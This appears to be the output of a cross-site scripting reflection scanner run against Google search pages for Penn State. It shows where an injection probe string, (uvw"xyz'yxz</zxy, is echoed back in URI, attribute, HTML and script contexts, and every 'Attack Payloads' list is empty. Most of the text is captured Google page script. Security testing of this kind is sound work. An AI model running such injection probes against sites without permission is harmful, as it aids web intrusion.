jsaction\x3d\x22tnv.scf\x22\x3e\x3c/form\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/li\x3e\x3c/ul\x3e\x3cspan class\x3d\x22hQKUmb\x22\x3e\x3c/span\x3e\x3cdiv class\x3d\x22hdtb-mn-hd\x22 aria-haspopup\x3d\x22true\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22\x3e\x3cdiv class\x3d\x22mn-hd-txt\x22\x3eAll results\x3c/div\x3e\x3cspan class\x3d\x22mn-dwn-arw\x22\x3e\x3c/span\x3e\x3c/div\x3e\x3cul class\x3d\x22hdtbU hdtb-mn-c\x22\x3e\x3cli class\x3d\x22hdtbItm hdtbSel\x22 id\x3d\x22li_\x22 tabindex\x3d\x220\x22\x3eAll results\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22li_1\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dPennState+site:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dli:1\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwiNn7LypuXoAhUNxzgGHeMYB6IQpwV6BAgBEB4\x22\x3eVerbatim\x3c/a\x3e\x3c/li\x3e\x3c/ul\x3e\x3cspan class\x3d\x22hQKUmb\x22\x3e\x3c/span\x3e\x3c/div\x3e');})();(function(){google.drty&&google.drty();})();});</script>
+
+----------------------------------------------------------------------------------
+URI Context: [12]
+<a href="/search?q=PennState+site:(uvw%2522xyz%2527yxz%253C/zxy&amp;gbv=1&amp;sei=rk2UXo2QAY2O4-EP47GckAo">
+<a class="gb_4 gb_5 gb_he gb_1c" href="https://accounts.google.com/ServiceLogin?hl=en&amp;passive=true&amp;continue=https://www.google.com/search%3Fq%3DPennState%26as_sitesearch%3D(uvw%2522xyz%27yxz%253C/zxy" target="_top">
+<a class="q qs" href="/search?q=PennState+site:(uvw%2522xyz%2527yxz%253C/zxy&amp;source=lnms&amp;tbm=isch&amp;sa=X&amp;ved=2ahUKEwiNn7LypuXoAhUNxzgGHeMYB6IQ_AUoAXoECAEQAw">
+<a class="q qs" href="/search?q=PennState+site:(uvw%2522xyz%2527yxz%253C/zxy&amp;source=lnms&amp;tbm=nws&amp;sa=X&amp;ved=2ahUKEwiNn7LypuXoAhUNxzgGHeMYB6IQ_AUoAnoECAEQBA">
+<a class="q qs" href="/search?q=PennState+site:(uvw%2522xyz%2527yxz%253C/zxy&amp;source=lnms&amp;tbm=vid&amp;sa=X&amp;ved=2ahUKEwiNn7LypuXoAhUNxzgGHeMYB6IQ_AUoA3oECAEQBQ">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=PennState+site:(uvw%2522xyz%2527yxz%253C/zxy&amp;source=lnms&amp;tbm=bks&amp;sa=X&amp;ved=2ahUKEwiNn7LypuXoAhUNxzgGHeMYB6IQ_AUoAHoECAEQBw">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=PennState+site:(uvw%2522xyz%2527yxz%253C/zxy&amp;source=lnms&amp;tbm=fin&amp;sa=X&amp;ved=2ahUKEwiNn7LypuXoAhUNxzgGHeMYB6IQ_AUoAXoECAEQCA">
+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?q%3DPennState%26as_sitesearch%3D(uvw%252522xyz%252527yxz%25253C/zxy" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwiNn7LypuXoAhUNxzgGHeMYB6IQo_oBegQIARAK">
+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?q%3DPennState%26as_sitesearch%3D(uvw%252522xyz%252527yxz%25253C/zxy#languages" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwiNn7LypuXoAhUNxzgGHeMYB6IQo_oBegQIARAL">
+<a class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/setprefs?safeui=on&amp;sig=0_yqVjDmZ3tgIEz3VbuwzU_HFYXbs%3D&amp;prev=https://www.google.com/search?q%3DPennState%26as_sitesearch%3D(uvw%252522xyz%252527yxz%25253C/zxy" id="safesearch" data-ved="2ahUKEwiNn7LypuXoAhUNxzgGHeMYB6IQo_oBegQIARAM">
+<a href="/advanced_search?q=PennState+site:(uvw%2522xyz%2527yxz%253C/zxy&amp;hl=en" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwiNn7LypuXoAhUNxzgGHeMYB6IQo_oBegQIARAN">
+<meta content="0;url=/search?q=PennState+site:(uvw%2522xyz%2527yxz%253C/zxy&amp;gbv=1&amp;sei=rk2UXo2QAY2O4-EP47GckAo" http-equiv="refresh">
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	False
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	False
+
+Attack Payloads for SCRIPT
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+_______________________________________________________________________________________________________
+https://www.google.com/search?q=(uvw"xyz'yxz</zxy&as_sitesearch=www.psu.edu
+
+----------------------------------------------------------------------------------
+Attribute Context: [2]
+<input class="gLFyf gsfi" maxlength="2048" name="q" type="text" jsaction="paste:puy29d" aria-autocomplete="both" aria-haspopup="false" autocapitalize="off" autocomplete="off" autocorrect="off" role="combobox" spellcheck="false" title="Search" value='(uvw"xyz&#39;yxz&lt;/zxy site:www.psu.edu' aria-label="Search" data-ved="0ahUKEwjS3aP0puXoAhWpxTgGHVXsDG8Q39UDCAk">
+<div jsdata="GXYZuf;;Bbph8s" jscontroller="G3eKy" jsl="$t t-w-XilABeKRA;$x 0;" class="r-iDFbXvcz50z4">
+
+----------------------------------------------------------------------------------
+HTML Context: [2]
+<title>(uvw"xyz'yxz&lt;/zxy site:www.psu.edu - Google Search</title>
+<em>(uvw&quot;xyz&#39;yxz&lt;/zxy site:www.psu.edu</em>
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script nonce="L9Smg1UI2ZEJnagJjMz46w==">(function(){google.ldi={};google.pim={};})();(function(){var u='/xjs/_/js/k\x3dxjs.s.en_GB.YlbWwcv8Rzo.O/ck\x3dxjs.s._psGpbc7COU.L.W.O/m\x3dFkg7bd,HcFEGb,IvlUe,MC8mtf,OF7gzc,RMhBfe,T4BAC,TJw5qb,TbaHGc,Y33vzc,ZyRBae,cdos,hsm,iDPoPb,jsa,mvYTse,tg8oTe,uz938c,vWNDde,ws9Tlc,yQ43ff,d,csi/am\x3dAAQAAMASgF13AJz_TQAAF8w4AAAggBvBxgIpIqEgAAGsuggCAQ/d\x3d1/dg\x3d2/ct\x3dzgms/rs\x3dACT90oGH5qsv6t9wsw0xPVUy40iHVnuuOQ';
+setTimeout(function(){var b=document;var a="SCRIPT";"application/xhtml+xml"===b.contentType&&(a=a.toLowerCase());a=b.createElement(a);a.src=u;google.timers&&google.timers.load&&google.tick&&google.tick("load","xjsls");document.body.appendChild(a)},0);})();(function(){window.google.xjsu='/xjs/_/js/k\x3dxjs.s.en_GB.YlbWwcv8Rzo.O/ck\x3dxjs.s._psGpbc7COU.L.W.O/m\x3dFkg7bd,HcFEGb,IvlUe,MC8mtf,OF7gzc,RMhBfe,T4BAC,TJw5qb,TbaHGc,Y33vzc,ZyRBae,cdos,hsm,iDPoPb,jsa,mvYTse,tg8oTe,uz938c,vWNDde,ws9Tlc,yQ43ff,d,csi/am\x3dAAQAAMASgF13AJz_TQAAF8w4AAAggBvBxgIpIqEgAAGsuggCAQ/d\x3d1/dg\x3d2/ct\x3dzgms/rs\x3dACT90oGH5qsv6t9wsw0xPVUy40iHVnuuOQ';})();function _DumpException(e){throw e;}
+function _F_installCss(c){}
+(function(){google.spjs=false;google.snet=true;google.em=[];google.emw=false;google.pdt=0;google.uwp=false;})();(function(){var pmc='{\x22Fkg7bd\x22:{},\x22HcFEGb\x22:{},\x22IvlUe\x22:{},\x22MC8mtf\x22:{},\x22OF7gzc\x22:{},\x22RMhBfe\x22:{},\x22T4BAC\x22:{},\x22TJw5qb\x22:{},\x22TbaHGc\x22:{},\x22Y33vzc\x22:{},\x22ZyRBae\x22:{},\x22aa\x22:{},\x22abd\x22:{\x22abd\x22:false,\x22deb\x22:false,\x22det\x22:false},\x22async\x22:{},\x22bgd\x22:{\x22ac\x22:true,\x22as\x22:true,\x22at\x22:0,\x22ea\x22:true,\x22ed\x22:0,\x22ei\x22:true,\x22el\x22:true,\x22ep\x22:true,\x22er\x22:true,\x22et\x22:0,\x22eu\x22:false,\x22wl\x22:false},\x22cdos\x22:{\x22cdobsel\x22:false},\x22csi\x22:{},\x22d\x22:{},\x22ddls\x22:{},\x22dvl\x22:{\x22cookie_secure\x22:true,\x22cookie_timeout\x22:86400,\x22driver_ui_type\x22:2,\x22jsc\x22:\x22[null,null,null,30000,null,null,null,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[\\\x2286400000\\\x22,\\\x22604800000\\\x22,2.0]\\n,null,1]\\n\x22,\x22mnr_crd\x22:\x221\x22,\x22msg_dsc\x22:\x22From your Internet address\x22,\x22msg_dsc_url\x22:\x22\x22,\x22msg_dvl\x22:\x22From your device\x22,\x22msg_err\x22:\x22Location unavailable\x22,\x22msg_gps\x22:\x22Using GPS\x22,\x22msg_unk\x22:\x22Unknown\x22,\x22msg_upd\x22:\x22Update location\x22,\x22msg_use\x22:\x22Use precise location\x22,\x22uul_text\x22:\x22Lahore\x22},\x22foot\x22:{\x22pf\x22:true,\x22po\x22:true,\x22qe\x22:false},\x22gf\x22:{\x22pid\x22:196},\x22hsm\x22:{},\x22iDPoPb\x22:{},\x22jsa\x22:{\x22csi\x22:true,\x22csir\x22:100},\x22kyn\x22:{},\x22llc\x22:{},\x22lu\x22:{},\x22m\x22:{},\x22mUpTid\x22:{},\x22mpck\x22:{\x22me\x22:false},\x22mu\x22:{\x22murl\x22:\x22https://adservice.google.com/adsid/google/ui\x22},\x22mvYTse\x22:{},\x22sb_wiz\x22:{\x22rfs\x22:[],\x22stok\x22:\x22I5fP249DS8iCzUZ1YN6CaBBI0As\x22},\x22sf\x22:{},\x22sonic\x22:{},\x22spch\x22:{\x22ae\x22:\x22Please check your microphone.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003ELearn more\\u003C/a\\u003E\x22,\x22hl\x22:\x22en-PK\x22,\x22im\x22:\x22Click \\u003Cb\\u003EAllow\\u003C/b\\u003E to start voice search\x22,\x22iw\x22:\x22Waiting...\x22,\x22lm\x22:\x22Listening...\x22,\x22lu\x22:\x22%1$s voice search not available\x22,\x22mb\x22:false,\x22ne\x22:\x22No Internet connection\x22,\x22nt\x22:\x22Didn\x27t get that. \\u003Cspan\\u003ETry again\\u003C/span\\u003E\x22,\x22nv\x22:\x22Please check your microphone and audio levels.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003ELearn more\\u003C/a\\u003E\x22,\x22pe\x22:\x22Voice search has been turned off.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003EDetails\\u003C/a\\u003E\x22,\x22rm\x22:\x22Speak now\x22},\x22tg8oTe\x22:{},\x22tl\x22:{\x22rvkey\x22:\x22AIzaSyC_9Rt88UMjzgg5pIVArnfuIVkJx4zCdTY\x22},\x22uz938c\x22:{},\x22vWNDde\x22:{},\x22vs\x22:{},\x22ws9Tlc\x22:{},\x22yQ43ff\x22:{}}';google.pmc=JSON.parse(pmc);})();(function(){var r=['sb_wiz','aa','abd','async','bgd','dvl','foot','kyn','lu','m','mUpTid','mpck','mu','sf','sonic','spch','tl','vs','exdc'];google.plm(r);})();(function(){var m=[[["root",[["t-w-XilABeKRA","iDFbXvcz50z4","r-iDFbXvcz50z4",null,null,"exdc"]
+]
+,""]
+]
+]
+;google.jsc&&google.jsc.m(m);google.log('rfl','');})();(function(){var m=['Bbph8k','[\x22psy-ab\x22,\x22gws-wiz\x22,\x22(uvw\\\x22xyz\x27yxz\\u003c/zxy site:www.psu.edu\x22,\x22\x22,null,1,0,0,11,\x22en\x22,\x22I5fP249DS8iCzUZ1YN6CaBBI0As\x22,\x22\x22,\x22sU2UXpLBO6mL4-EP1diz-AY\x22,0,\x22en-PK\x22,null,null,null,0,null,null,3,5,null,null,0,-1,0,0,0,\x22\x22,0,0,\x22\x22,null,0,null,0,null,\x22/suggest\x22,0,0,0,0,0]\n','Bbph8o','[0,0,0,[null,null,[[[3,null,null,[null,[[\x22qdr_\x22,1,6]\n,[\x22qdr_h\x22,0,6]\n,[\x22qdr_d\x22,0,6]\n,[\x22qdr_w\x22,0,6]\n,[\x22qdr_m\x22,0,6]\n,[\x22qdr_y\x22,0,6]\n,[\x22cdr_opt\x22,0,1,[1,\x22Custom range...\x22,null,\x22cdr:1,cd_min:x,cd_max:x\x22,\x22\x22,\x22text\x22,\x22\x22,\x22\x22,6,1,[[[\x22q\x22,\x22(uvw\\\x22xyz\x27yxz\\u003c/zxy site:www.psu.edu\x22]\n]\n]\n,\x22cdr_opt\x22,\x225/23/2004\x22,0]\n]\n]\n,0]\n]\n,[3,null,null,[null,[[\x22li_\x22,1,6]\n,[\x22li_1\x22,0,6]\n]\n,1]\n]\n]\n,null,[\x22tbs\x22]\n]\n]\n,null,null,[null,[[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:www.psu.edu\\u0026source\\u003dlnms\x22,null,null,\x22All\x22,1,null,1,null,null,\x22WEB\x22,[0,2]\n,null,null,0]\n,[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:www.psu.edu\\u0026source\\u003dlnms\\u0026tbm\\u003disch\x22,null,null,\x22Images\x22,0,null,1,null,null,\x22IMAGES\x22,[6,2]\n,null,null,6]\n,[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:www.psu.edu\\u0026source\\u003dlnms\\u0026tbm\\u003dvid\x22,null,null,\x22Videos\x22,0,null,1,null,null,\x22VIDEOS\x22,[13,2]\n,null,null,13]\n,[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:www.psu.edu\\u0026source\\u003dlnms\\u0026tbm\\u003dnws\x22,null,null,\x22News\x22,0,null,1,null,null,\x22NEWS\x22,[10,2]\n,null,null,10]\n]\n,[[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:www.psu.edu\\u0026source\\u003dlnms\\u0026tbm\\u003dbks\x22,null,null,\x22Books\x22,0,null,1,null,null,\x22BOOKS\x22,[2,2]\n,null,null,2]\n,[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:www.psu.edu\\u0026source\\u003dlnms\\u0026tbm\\u003dfin\x22,null,null,\x22Finance\x22,0,null,1,null,null,\x22FINANCE\x22,[22,2]\n,null,null,22]\n]\n]\n,null,1]\n','Bbph8s','[0,\x22inline\x22,2,2500,0,0]\n','Bbph8w','[null,null,1,30000,null,null,null,2,null,null,3,null,null,null,null,null,1,null,null,null,null,null,null,[31.506432,74.3473152]\n,null,null,null,null,0,null,null,null,null,null,null,null,0,\x221586777521\x22,null,null,null,null,null,1,null,null,[\x2286400000\x22,\x22604800000\x22,2.0]\n,null,1]\n','Bbph80','[\x22https://www.google.com.pk/domainless/read?igu\\u003d1\x22,\x22AFz9ztv0uMX4ndAmOPmZu5kBu4kDro_rxQ:1586777522144\x22,3]\n','Bbph84','[1,null,null,1261,1349,0]\n'];
+var a=m;window.W_jd=window.W_jd||{};for(var b=0;b<a.length;b+=2)window.W_jd[a[b]]=JSON.parse(a[b+1]);})();(function(){window.WIZ_global_data={"Yllh3e":"%.@.1586777521974994,104383913,1863117909]\n","zChJod":"%.@.]\n","pxO4Zd":"0","GWsdKe":"en-PK","SIsrTd":"false","LU5fGb":"false","w2btAe":"%.@.\"\",\"\",\"0\",null,null,null,1]\n","eptZe":"/_/WizRpcUi/","mXOY5d":"%.@.null,1]\n","fyLpDc":"","SsQ4x":"L9Smg1UI2ZEJnagJjMz46w\u003d\u003d","qDYzS":"0 2px 10px 0 rgba(0,0,0,0.2)","BdVmgf":"16","eGDqv":"false","RJegIe":"#fffff0","JpB3Ue":"60","ZLr84e":"true","K2vQjf":"#f8f8f8","EuCkcd":"16","iDTSkb":"true","Dc0uuf":"16","auaxA":"#222","ToXxme":"#e5e5e5","AwPxw":"false","wku5sd":"false","khoEPb":"#1a0dab","PPUcAe":"0px 0px 8px rgba(32, 33, 36, .24)","Vzh4p":"0px 7px 6px -5px #DFE1E5","ODgkgd":"#fff","bmQ7Rb":"false","KgXmrd":"true","PYrjqe":"40","GTYTQ":"#ffeb3b","FbN3Qc":"rgba(0,0,0,.87)","KdGe5c":"false","tyCgpc":"#fff","oFa0q":"#fafafa","PxA5sf":"rgba(0,0,0,.54)","R9GQh":"#fff","h29koe":"32","Na6wt":"#e1e1e1","XgWQKd":"true","YXGVrd":"true","V0Bluc":"none","fjc61":"false","SATNMc":"1px solid #dfe1e5","xDKXr":"false","By1ejd":"16","AEMHld":"#eeeeee","xFbXr":"rgba(0,102,33,1)","RZ03Ve":"#5677fc","haqSDf":"rgba(0,0,0,.54)","D8A8he":"true","KTkDB":"false","NW4nA":"rgba(255,255,255,.7)","JcUGee":"rgba(0,0,0,.54)","F4ULTd":"true","zhBJde":"false","H7aRye":"0px 5px 26px 0px rgba(0, 0, 0, 0.22), 0px 20px 28px 0px rgba(0, 0, 0, 0.30)","mJempe":"13","Tae7A":"true","o9mzkf":"false","AYVQWe":"20px","IfHuyb":"rgba(0,0,0,.54)","AP8pqf":"rgba(0,0,0,.12)","FF58Bf":"true","BYw9f":"false","BwgO5":"16","ppkaeb":"0","s6Rzec":"0 16px","xBx7Dc":"36","xvI8we":"#212121","WWz0vd":"false","X1bUEc":"arial,sans-serif-medium,sans-serif","KFdH8":"true","ENmP1c":"rgba(204,204,204,.15)","prFQBe":"#ebebeb","kvKIW":"false","WnrBce":"rgba(0,0,0,.1)","QSF9Ec":"","RpI44b":"#ebebeb","eE52Jd":"#5f6368","SidP2e":"rgba(248, 248, 248, 0)","W445Dc":"20","ZxI7Af":"#fafafa","o07h3e":"0 4px 5px rgba(0,0,0,.16)","HWmJg":"#dcdcdc","gir54":"0.4","SuQiSc":"1.3","q7vEEb":"false","ZzVVh":"false","jg5SCd":"false","UduJSb":"%.@.\"0 0\",0,0,20,20,\"/images/searchbox/desktop_searchbox_sprites302_hr.png\",\"20px\"]\n","vIMrp":"true","klgere":"invert(1) hue-rotate(180deg)","tqXjO":"false","eo8dye":"#878787","seVajd":"rgba(0,0,0,.12)","Nk1Bhf":"#4285f4","A2aVpb":"50","sPiebd":"false","bVUXme":"25","pLhKvc":"0","in3Ilb":"#222","I69zkb":"rgba(204,204,204,.25)","SpZHZd":"true","yFVHo":"true","y2Hs7d":"false","oyB9kf":"rgba(0,0,0,.87)","VXIo7d":"8px","dAFa0e":"false","iwHJId":"15","uRoR4d":"false","fQC6Cf":"2px","ekXXzb":"13px","j0DpSe":"false","u4NTBb":"40","xz9C5b":"true","QDXUyc":"#188038","iniaFd":"true","OqjdAf":"true","z1x4kc":"true","zhkRO":"%.@.1,1,1,1,1,1,0,0,0,1]\n","hqg9c":"#1878f0","kL6Xwb":"false","pch72b":"false","T1V3fc":"#f4b400","gjAni":"#3c4043","Rnt1Qc":"false","V6eh7c":"16","xeVOLe":"#689f38","bmAEG":"#d9d9d9","o28sBd":"false","kkVYtc":"false","wlwuHd":"false","AQEr7b":"#c6c6c6","pPtK5":"6","VnH1Zb":"normal","qmiCId":"true","b1KZw":"#fff","j9ZYRc":"true","S7nbec":"16","AYXCHc":"false","VbmVYd":"true","kVbEH":"false","Fcb4A":"#1A73E8","LIYDac":"arial,sans-serif","Mlljec":"false","ymIfqf":"18","aD6AQe":"#757575","VQfWj":"#c0c0c0","gqXETb":"#db4437","BW8dtd":"rgba(248, 248, 248, 1)","ruHO7c":"#dd191d","X4DPRd":"true","umYEvb":"false","zHtpPb":"false","i7mh3e":"16","MOPyub":"15","OQZvxe":"0 2px 10px 0 rgba(0,0,0,0.2)","QnH6ad":"16","EJG4vf":"pointer","KVmtZc":"rgba(255,255,255,.3)","a7rhWc":"false","rX9Pnb":"16","aUt4Tc":"false","FydCC":"true","WMBRj":"#009688","EgTnfe":"true","ZMFELd":"false","KnXmRc":"10","SezQgf":"500","PuOePe":"false","bDOvJc":"false","kePaAc":"-4","qkXvHd":"500","hgWJ8c":"false","UnFEre":"16","wB1JTc":"false","HjM8R":"#FFF","MoAfyf":"#fff","gbf9Eb":"58","pxDH4c":"#0f9d58","N31mf":"false","qj36Ef":"#323232","MiTaT":"#1A73E8","Vdtb3d":"true","dTMnbc":"false","hWyTvf":"false","p7BdKe":"true","S1ZUDf":"true","Utapxe":"-webkit-","fRkoq":"true","TKn0F":"20px","rsd6be":"1","IvNqzc":"true","PngPbb":"rgba(0,0,0,.87)","ue6nDb":"Roboto-Medium,Roboto-Regular","n1Whrf":"false","YWHUvb":"18px","JVBnre":"false","L6WyEf":"true","imHXAf":"true","FYBlgf":"false","rRLesf":"0","y519we":"true","QldWK":"6","EqX55c":"652","v44rSc":"#70757a","FiZWae":"32","UNVSy":"false","ib0wve":"rgba(153,153,153,.2)","WxHUzd":"true","buGAI":"16","abZ6pc":"#f9a825","LnZAkd":"false","vhCwfc":"false","hbfefd":"#1A73E8","NIYCKf":"28","nMRhJe":"false","y1HZEd":"false","eXPt4e":"400","aKuscd":"#AECBFA","NvsKMd":"true","WyvaRd":"0 1px 1px rgba(0,0,0,.16)","iKzRxb":"#5f6368","lVRwic":"false","xT28q":"false","GzC2p":"#fff","TUhOL":"#fafafa","tpLZye":"#fff","k7G1xb":"15","KD9WYe":"#1A73E8","LACYrf":"false","rWPbFe":"rgba(255,255,255,1)","osNyZ":"1.0","SfSmD":"#ebebeb","lzJv9d":"#fff","fFepd":"-15","X4yPd":"#1c3aa9","z70S0c":"false","JRGsye":"none","tqmosb":"#fff","Sgnmlc":"14px","tuTJ6d":"#b8b8b8","OjG6Qc":"#000","EiEfXb":"#ebebeb","pDiOce":"false","rx1dvd":"#f3f3f3","wFGKdc":"false","srQSvc":"true","rZYUef":"#f5f5f5","B8Dib":"rgba(0,0,0,.87)","QA73ad":"false","Ym5Ycb":"false","cdRSXc":"false","owXwYb":"#f8f8f8","a8Umdd":"rgba(153,153,153,.4)","g635Ab":"2px","PIn0Ab":"1px solid #DFE1E5","voc95c":"false","tJ4Jdf":"11","A5tF3b":"false","U6xP0":"#4285f4","e2p8ee":"false","BoqNoc":"20px","JyBo2c":"false","sBpVac":"rgba(0,0,0,.26)","lLCPB":"true","ConpTc":"false","jIrJIf":"14","B0husb":"true","iryGqc":"2","bXvyY":"#fff","Hzi6pf":"#DFE1E5"};window.IJ_values=["#fff","rgba(0,102,33,1)","rgba(0,0,0,.87)","rgba(0,0,0,.54)","rgba(255,255,255,1)","rgba(255,255,255,.7)",false,"%.@.\"\",\"\",\"0\",null,null,null,1]\n","0","%.@.null,1]\n","%.@.]\n","L9Smg1UI2ZEJnagJjMz46w\u003d\u003d","%.@.\"0 0\",0,0,20,20,\"/images/searchbox/desktop_searchbox_sprites302_hr.png\",\"20px\"]\n","en-PK",false,"","%.@.1586777521974994,104383913,1863117909]\n",false,"/_/WizRpcUi/"];})();google.x(null, function(){(function(){(function(){google.csct={};google.csct.ps='AOvVaw3IwVhCU0S7GayXN-k16t3C\x26ust\x3d1586863922023033';})();})();(function(){(function(){google.csct.pi=true;})();})();(function(){(function(){
+function f(){for(var c="&cshid="+google.cshid,d=document.querySelectorAll('[href^="/"]'),e=0,b;b=d[e++];){var a=b.getAttribute("href");a.match(/[\?|&](ei|ved)=/)&&-1==a.indexOf("cshid=")&&(-1==a.search("#")?b.setAttribute("href",a+c):(a=a.split("#"),b.setAttribute("href",a[0]+c+"#"+a[1])))}d=document.querySelectorAll("[ping]");for(e=0;b=d[e++];)a=b.getAttribute("ping"),-1==a.indexOf("cshid=")&&b.setAttribute("ping",a+c)};google.csh=google.csh||{};google.csh.ict=function(c){google.cshid&&(c&&window.MutationObserver?google.dclc(function(){(new MutationObserver(f)).observe(document.querySelector("body"),{attributes:!0,childList:!0,subtree:!0,characterData:!0})}):google.dclc(f))};}).call(this);})();(function(){(function(){var umo=false;google.csh.ict(umo);})();})();(function(){window.jsl=window.jsl||{};window.jsl.dh=window.jsl.dh||function(i,c,d){try{var e=document.getElementById(i);if(e){e.innerHTML=c;if(d){d();}}else{if(window.jsl.el){window.jsl.el(new Error('Missing ID.'),{'id':i});}}}catch(e){if(window.jsl.el){window.jsl.el(new Error('jsl.dh'));}}};})();(function(){window.jsl.dh('hdtbMenus','\x3cdiv class\x3d\x22hdtb-mn-cont\x22\x3e\x3cdiv id\x3d\x22XJDHvf\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22hdtb-mn-hd\x22 aria-haspopup\x3d\x22true\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22\x3e\x3cdiv class\x3d\x22mn-hd-txt\x22\x3eAny time\x3c/div\x3e\x3cspan class\x3d\x22mn-dwn-arw\x22\x3e\x3c/span\x3e\x3c/div\x3e\x3cul class\x3d\x22hdtbU hdtb-mn-c\x22\x3e\x3cli class\x3d\x22hdtbItm hdtbSel\x22 id\x3d\x22qdr_\x22 tabindex\x3d\x220\x22\x3eAny time\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_h\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:www.psu.edu\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:h\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjS3aP0puXoAhWpxTgGHVXsDG8QpwV6BAgBEBY\x22\x3ePast hour\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_d\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:www.psu.edu\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:d\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjS3aP0puXoAhWpxTgGHVXsDG8QpwV6BAgBEBc\x22\x3ePast 24 hours\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_w\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:www.psu.edu\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:w\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjS3aP0puXoAhWpxTgGHVXsDG8QpwV6BAgBEBg\x22\x3ePast week\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_m\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:www.psu.edu\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:m\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjS3aP0puXoAhWpxTgGHVXsDG8QpwV6BAgBEBk\x22\x3ePast month\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_y\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:www.psu.edu\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:y\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjS3aP0puXoAhWpxTgGHVXsDG8QpwV6BAgBEBo\x22\x3ePast 